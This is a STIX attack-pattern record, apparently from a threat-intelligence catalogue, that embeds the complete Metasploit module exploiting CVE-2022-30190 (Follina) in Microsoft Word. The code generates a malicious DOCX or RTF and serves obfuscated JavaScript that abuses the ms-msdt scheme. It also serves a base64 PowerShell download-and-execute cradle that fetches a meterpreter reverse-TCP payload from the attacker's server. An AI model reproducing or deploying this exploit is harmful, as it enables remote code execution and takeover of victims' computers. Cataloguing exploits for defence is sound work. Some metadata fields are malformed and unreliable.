{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--95ca40a9-a8c7-4476-b020-267459a036ae",
    "created": "2024-08-14T16:36:56.018802Z",
    "modified": "2024-08-14T16:36:56.018806Z",
    "name": "Microsoft Office Word MSDTJS",
    "description": " This module generates a malicious Microsoft Word document that when loaded, will leverage the remote template feature to fetch an `HTML` document and then use the `ms-msdt` scheme to execute `PowerShell` code.  'References' => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/word_msdtjs_rce.rb",
            "external_id": "word_msdtjs_rce.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.reddit.com/r/blueteamsec/comments/v06w2o/suspected_microsoft_word_zero_day_in_the_wild/"
        },
        {
            "source_name": "reference",
            "url": "https://twitter.com/nao_sec/status/1530196847679401984?t=3Pjrpdog_H6OfMHVLMR5eQ&s=19"
        },
        {
            "source_name": "reference",
            "url": "https://app.any.run/tasks/713f05d2-fe78-4b9d-a744-f7c133e3fafb/"
        },
        {
            "source_name": "reference",
            "url": "https://doublepulsar.com/follina-a-microsoft-office-code-execution-vulnerability-1a47fce5629e"
        },
        {
            "source_name": "reference",
            "url": "https://twitter.com/GossiTheDog/status/1531608245009367040"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/JMousqueton/PoC-CVE-2022-30190"
        },
        {
            "source_name": "rtf_file_data=exploit_data(CVE-2022-30190",
            "external_id": "cve_2022_30190_rtf_template.rtf)"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::FILEFORMAT\n  include Msf::Exploit::Powershell\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Post::File\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Microsoft Office Word MSDTJS',\n        'Description' => %q{\n          This module generates a malicious Microsoft Word document that when loaded, will leverage the remote template\n          feature to fetch an `HTML` document and then use the `ms-msdt` scheme to execute `PowerShell` code.\n        },\n        'References' => [\n          ['CVE', '2022-30190'],\n          ['URL', 'https://www.reddit.com/r/blueteamsec/comments/v06w2o/suspected_microsoft_word_zero_day_in_the_wild/'],\n          ['URL', 'https://twitter.com/nao_sec/status/1530196847679401984?t=3Pjrpdog_H6OfMHVLMR5eQ&s=19'],\n          ['URL', 'https://app.any.run/tasks/713f05d2-fe78-4b9d-a744-f7c133e3fafb/'],\n          ['URL', 'https://doublepulsar.com/follina-a-microsoft-office-code-execution-vulnerability-1a47fce5629e'],\n          ['URL', 'https://twitter.com/GossiTheDog/status/1531608245009367040'],\n          ['URL', 'https://github.com/JMousqueton/PoC-CVE-2022-30190']\n        ],\n        'Author' => [\n          'nao sec', # Original disclosure.\n          'mekhalleh (RAMELLA S\u00e9bastien)', # Zeop CyberSecurity\n          'bwatters-r7' # RTF support\n        ],\n        'DisclosureDate' => '2022-05-29',\n        'License' => MSF_LICENSE,\n        'Privileged' => false,\n        'Platform' => 'win',\n        'Arch' => [ARCH_X86, ARCH_X64],\n        'Payload' => {\n          'DisableNops' => true\n        },\n        'DefaultOptions' => {\n          'DisablePayloadHandler' => false,\n          'FILENAME' => 'msf.docx',\n          'PAYLOAD' => 'windows/x64/meterpreter/reverse_tcp',\n          'SRVHOST' => Rex::Socket.source_address('1.2.3.4')\n        },\n        'Targets' => [\n          [ 'Microsoft Office Word', {} ]\n        ],\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'AKA' => ['Follina'],\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [UNRELIABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]\n        }\n      )\n    )\n\n    register_options([\n      OptPath.new('CUSTOMTEMPLATE', [false, 'A DOCX file that will be used as a template to build the exploit.']),\n      OptEnum.new('OUTPUT_FORMAT', [true, 'File format to use [docx, rtf].', 'docx', %w[docx rtf]]),\n      OptBool.new('OBFUSCATE', [true, 'Obfuscate JavaScript content.', true])\n    ])\n  end\n\n  def get_file_in_docx(fname)\n    i = @docx.find_index { |item| item[:fname] == fname }\n\n    unless i\n      fail_with(Failure::NotFound, \"This template cannot be used because it is missing: #{fname}\")\n    end\n\n    @docx.fetch(i)[:data]\n  end\n\n  def get_template_path\n    datastore['CUSTOMTEMPLATE'] || File.join(Msf::Config.data_directory, 'exploits', 'word_msdtjs.docx')\n  end\n\n  def generate_html\n    uri = \"#{@proto}://#{datastore['SRVHOST']}:#{datastore['SRVPORT']}#{normalize_uri(@my_resources.first.to_s)}.ps1\"\n\n    dummy = ''\n    (1..random_int(61, 100)).each do |_n|\n      dummy += '//' + rand_text_alpha(100) + \"\\n\"\n    end\n\n    cmd = Rex::Text.encode_base64(\"IEX(New-Object Net.WebClient).downloadString('#{uri}')\")\n\n    js_content = \"window.location.href = \\\"ms-msdt:/id PCWDiagnostic /skip force /param \\\\\\\"IT_RebrowseForFile=cal?c IT_LaunchMethod=ContextMenu IT_SelectProgram=NotListed IT_BrowseForFile=h$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'UTF8.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'#{cmd}'+[char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe IT_AutoTroubleshoot=ts_AUTO\\\\\\\"\\\";\"\n    if datastore['OBFUSCATE']\n      print_status('Obfuscate JavaScript content')\n\n      js_content = Rex::Exploitation::JSObfu.new js_content\n      js_content = js_content.obfuscate(memory_sensitive: false)\n    end\n\n    html = '<!DOCTYPE html><html><head><meta http-equiv=\"Expires\" content=\"-1\"><meta http-equiv=\"X-UA-Compatible\" content=\"IE=11\"></head><body><script>'\n    html += \"\\n#{dummy}\\n#{js_content}\\n\"\n    html += '</script></body></html>'\n\n    html\n  end\n\n  def inject_docx\n    document_xml = get_file_in_docx('word/document.xml')\n    unless document_xml\n      fail_with(Failure::NotFound, 'This template cannot be used because it is missing: word/document.xml')\n    end\n\n    document_xml_rels = get_file_in_docx('word/_rels/document.xml.rels')\n    unless document_xml_rels\n      fail_with(Failure::NotFound, 'This template cannot be used because it is missing: word/_rels/document.xml.rels')\n    end\n\n    uri = \"#{@proto}://#{datastore['SRVHOST']}:#{datastore['SRVPORT']}#{normalize_uri(@my_resources.first.to_s)}.html\"\n    @docx.each do |entry|\n      case entry[:fname]\n      when 'word/_rels/document.xml.rels'\n        entry[:data] = document_xml_rels.to_s.gsub!('TARGET_HERE', \"#{uri}&#x21;\")\n      end\n    end\n  end\n\n  def normalize_uri(*strs)\n    new_str = strs * '/'\n\n    new_str = new_str.gsub!('//', '/') while new_str.index('//')\n\n    # makes sure there's a starting slash\n    unless new_str.start_with?('/')\n      new_str = '/' + new_str\n    end\n\n    new_str\n  end\n\n  def on_request_uri(cli, request)\n    header_html = {\n      'Access-Control-Allow-Origin' => '*',\n      'Access-Control-Allow-Methods' => 'GET, POST',\n      'Cache-Control' => 'no-store, no-cache, must-revalidate',\n      'Content-Type' => 'text/html; charset=UTF-8'\n    }\n\n    if request.method.eql? 'HEAD'\n      send_response(cli, '', header_html)\n    elsif request.method.eql? 'OPTIONS'\n      response = create_response(501, 'Unsupported Method')\n      response['Content-Type'] = 'text/html'\n      response.body = ''\n\n      cli.send_response(response)\n    elsif request.raw_uri.to_s.end_with? '.html'\n      print_status('Sending HTML Payload')\n\n      send_response_html(cli, generate_html, header_html)\n    elsif request.raw_uri.to_s.end_with? '.ps1'\n      print_status('Sending PowerShell Payload')\n\n      send_response(cli, @payload_data, header_html)\n    end\n  end\n\n  def pack_docx\n    @docx.each do |entry|\n      if entry[:data].is_a?(Nokogiri::XML::Document)\n        entry[:data] = entry[:data].to_s\n      end\n    end\n\n    Msf::Util::EXE.to_zip(@docx)\n  end\n\n  def build_rtf\n    print_status('Generating a malicious rtf file')\n\n    uri = \"#{@proto}://#{datastore['SRVHOST']}:#{datastore['SRVPORT']}#{normalize_uri(@my_resources.first.to_s)}.html\"\n    uri_space = 76 # this includes the required null character\n    uri_max = uri_space - 1\n    if uri.length > uri_max\n      fail_with(Failure::BadConfig, \"The total URI must be no more than #{uri_max} characters\")\n    end\n    # we need the hex string of the URI encoded as UTF-8 and UTF-16\n    uri.force_encoding('utf-8')\n    uri_utf8_hex = uri.each_byte.map { |b| b.to_s(16).rjust(2, '0') }.join\n    uri_utf8_hex << '0' * ((uri_space * 2) - uri_utf8_hex.length)\n\n    uri_utf16 = uri.encode('utf-16')\n    # remove formatting char and convert to hex\n    uri_utf16_hex = uri_utf16[1..].each_byte.map { |b| b.to_s(16).rjust(2, '0') }.join\n    uri_utf16_hex << '0' * ((uri_space * 4) - uri_utf16_hex.length)\n    rtf_file_data = exploit_data('CVE-2022-30190', 'cve_2022_30190_rtf_template.rtf')\n    rtf_file_data.gsub!('REPLACE_WITH_URI_STRING_ASCII', uri_utf8_hex)\n    rtf_file_data.gsub!('REPLACE_WITH_URI_STRING_UTF16', uri_utf16_hex)\n    rtf_file_data.gsub!('REPLACE_WITH_URI_STRING', uri)\n    file_create(rtf_file_data)\n  end\n\n  def build_docx\n    print_status('Generating a malicious docx file')\n\n    template_path = get_template_path\n    unless File.extname(template_path).downcase.end_with?('.docx')\n      fail_with(Failure::BadConfig, 'Template is not a docx file!')\n    end\n\n    @docx = unpack_docx(template_path)\n    print_status('Injecting payload in docx document')\n    inject_docx\n    print_status(\"Finalizing docx '#{datastore['FILENAME']}'\")\n    file_create(pack_docx)\n  end\n\n  def primer\n    @proto = (datastore['SSL'] ? 'https' : 'http')\n\n    if datastore['OUTPUT_FORMAT'] == 'rtf'\n      build_rtf\n    else\n      build_docx\n    end\n    @payload_data = cmd_psh_payload(payload.encoded, payload_instance.arch.first, remove_comspec: true, exec_in_place: true)\n    super\n  end\n\n  def random_int(min, max)\n    rand(max - min) + min\n  end\n\n  def unpack_docx(template_path)\n    document = []\n\n    Zip::File.open(template_path) do |entries|\n      entries.each do |entry|\n        if entry.name.downcase.end_with?('.xml', '.rels')\n          content = Nokogiri::XML(entry.get_input_stream.read) if entry.file?\n        elsif entry.file?\n          content = entry.get_input_stream.read\n        end\n\n        vprint_status(\"Parsing item from template: #{entry.name}\")\n\n        document << { fname: entry.name, data: content }\n      end\n    end\n\n    document\n  end\n\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2022-05-29",
    "x_mitre_platforms": [
        "win'"
    ]
}